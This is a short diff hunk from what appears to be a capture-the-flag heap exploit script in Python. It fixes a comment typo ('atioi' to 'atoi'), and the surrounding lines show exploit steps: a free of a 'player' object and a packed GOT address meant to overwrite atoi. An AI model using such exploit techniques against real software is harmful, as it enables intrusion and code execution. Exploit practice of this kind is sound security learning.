@@ -105,7 +105,7 @@ def exploit(r):
     log.info("[+] bash : " + hex(bash))
     #free the fourth player
     free(3)
-    #pack the atioi address
+    #pack the atoi address
     got = p64(0x603110)
 
     #write player 3 with atoi function 
